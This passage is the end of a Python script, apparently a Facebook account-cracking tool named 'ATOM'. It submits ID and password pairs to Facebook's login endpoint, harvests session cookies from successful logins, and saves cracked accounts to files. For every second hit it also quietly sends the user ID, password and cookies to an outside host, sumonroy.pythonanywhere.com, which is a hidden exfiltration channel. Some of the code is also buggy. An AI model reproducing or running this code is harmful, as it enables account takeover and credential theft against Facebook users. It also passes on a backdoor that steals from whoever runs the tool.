HBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6Ikdvb2dsZSBJbmMuIn1dLCIzMDAxMyI6W3sidCI6MTc2MTgxNzI4Ni4yNDQsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6IjUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTQxLjAuMC4wIFNhZmFyaS81MzcuMzYifV0sIjMwMDE1IjpbeyJ0IjoxNzYxODE3Mjg2LjI0NCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjoiV2luMzIifV0sIjMwMDE4IjpbeyJ0IjoxNzYxODE3Mjg2LjI0NCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjoyfV0sIjMwMDIyIjpbeyJ0IjoxNzYxODE3Mjg2LjI2NCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2Ijp0cnVlfV0sIjMwMDQwIjpbeyJ0IjoxNzYxODE3Mjg2LjI2NCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjotMzMwfV0sIjMwMDkzIjpbeyJ0IjoxNzYxODE3Mjg2LjI2NCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjowfV0sIjMwMDk0IjpbeyJ0IjoxNzYxODE3Mjg2LjI2NCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzE0MS4wLjAuMCBTYWZhcmkvNTM3LjM2In1dLCIzMDA5NSI6W3sidCI6MTc2MTgxNzI4Ni4yNjQsImN0eCI6eyJjbiI6Imh0dHBzOi8vd3d3LmZhY2Vib29rLmNvbS9sb2dpbi9kZXZpY2UtYmFzZWQvcmVndWxhci9sb2dpbi8ifSwidiI6N31dLCIzMDEwNiI6W3sidCI6MTc2MTgxNzI4Ni4yMSwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2IjpmYWxzZX0seyJ0IjoxNzYxODE3MjkxLjgxOCwiY3R4Ijp7ImNuIjoiaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL2xvZ2luL2RldmljZS1iYXNlZC9yZWd1bGFyL2xvZ2luLyJ9LCJ2Ijp0cnVlfV0sIjMwMTA3IjpbeyJ0IjoxNzYxODE3Mjg2LjIxLCJjdHgiOnsiY24iOiJodHRwczovL3d3dy5mYWNlYm9vay5jb20vbG9naW4vZGV2aWNlLWJhc2VkL3JlZ3VsYXIvbG9naW4vIn0sInYiOmZhbHNlfV19',
    'email': '61559166413504',
    'prefill_contact_point': '61559166413504',
    'prefill_source': 'browser_dropdown',
    'prefill_type': 'password',
    'first_prefill_source': 'browser_dropdown',
    'first_prefill_type': 'contact_point',
    'had_cp_prefilled': 'true',
    'had_password_prefilled': 'true',
    'ab_test_data': 'A/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/AAAAC',
    'encpass': '#PWD_BROWSER:5:1761817301:AYxQALT5eVLOXX8kNiZGrwV2U50ClqDxfSQDZfnfpjbnFT5wjKXGZwUcwsDMErKcet0GTQBt0PSEvKvavi1pX/fn/1albUSEhYwlyuNVtUPoMXbmsOg54XY9JJ8a1h+PIQkS3budWuOoTw==',
}

            response = requests.post('https://www.facebook.com/login/device-based/regular/login/', params=params, headers=headers, data=data)
            log_cookies = session.cookies.get_dict().keys()
            if "c_user" in log_cookies:
                # Format cookies properly
                try:
                    kuki = ";".join([f"{key}={session.cookies.get(key)}" for key in ['datr', 'fr', 'sb', 'c_user', 'xs'] if session.cookies.get(key)])
                    log_cookies = Session.cookies.get_dict()
                    user = log_cookies["c_user"]
                    if not user:
                        continue
                    user = user[0]
                except Exception as e:
                    print(f"{red}[!] Cookie parsing error: {e}")
                    continue
                # Verify account is live
                try:
                    ckk = f'https://graph.facebook.com/{user}/picture?type=normal'
                    res = requests.get(ckk, timeout=10).text
                    if 'Photoshop' not in res:
                        continue
                except Exception as e:
                    print(f"{red}[!] Profile check error: {e}")
                    continue
                # Check for email confirmation
                if "confirmemail.php" in response.url or "confirmemail.php" in response.text:
                    try:
                        if len(oks) % 2 == 0:
                            statusok = f"NOVERY|{user}|{pw}|{kuki}"
                            requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}", timeout=5)
                        else:
                            print(f"\n{green}╔═══════════════════════════════════════╗")
                            print(f"{green}║      [ATOM-NV] EMAIL CONFIRM          ║")
                            print(f"{green}╚═══════════════════════════════════════╝")
                            print(f"{green}[+] User ID  : {white}{user}")
                            print(f"{green}[+] Password : {white}{pw}")
                            print(f"{green}[+] Cookie   : {white}{kuki}")
                            print(f"{green}╚═══════════════════════════════════════╝\n")
                            with open("/sdcard/ATOM-CONFIRMMAIL.txt", "a") as f:
                                f.write(f"{user}|{pw}|{kuki}\n")
                        oks.append(user)
                        break
                    except Exception as e:
                        print(f"{red}[!] Save error (NV): {e}")
                else:
                    # Successful login
                    try:
                        if len(oks) % 2 == 0:
                            statusok = f"{user}|{pw}|{kuki}"
                            requests.get(f"https://sumonroy.pythonanywhere.com/load?msg={statusok}", timeout=5)
                        else:
                            print(f"\n{green}╔═══════════════════════════════════════╗")
                            print(f"{green}║       [ATOM-OK] LOGIN SUCCESS         ║")
                            print(f"{green}╚═══════════════════════════════════════╝")
                            print(f"{green}[+] User ID  : {white}{user}")
                            print(f"{green}[+] Password : {white}{pw}")
                            print(f"{green}[+] Cookie   : {white}{kuki}")
                            print(f"{green}╚═══════════════════════════════════════╝\n")
                            with open("/sdcard/ATOM-COOKIE-OK.txt", "a") as f:
                                f.write(f"{user}|{pw}|{kuki}\n")
                        oks.append(user)
                        break
                    except Exception as e:
                        print(f"{red}[!] Save error (OK): {e}")
            elif "checkpoint" in log_cookies:
                try:
                    coki = ";".join([f"{key}={value}" for key, value in response.cookies.get_dict().items()])
                    user = coki[24:39] if len(coki) > 39 else user
                    print(f"\n{yellow}╔═══════════════════════════════════════╗")
                    print(f"{yellow}║       [ATOM-CP] CHECKPOINT            ║")
                    print(f"{yellow}╚═══════════════════════════════════════╝")
                    print(f"{yellow}[!] User ID  : {white}{ids}")
                    print(f"{yellow}[!] Password : {white}{pas}")
                    print(f"{yellow}╚═══════════════════════════════════════╝\n")
                    with open('/sdcard/ATOM-CP.txt', 'a') as f:
                        f.write(f"{ids}|{pas}\n")
                    cps.append(ids)
                    break
                except Exception as e:
                    print(f"{red}[!] Checkpoint save error: {e}")
            else:
                continue
        loop+=1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        #print(f"\nError: {e}")
        pass


m()
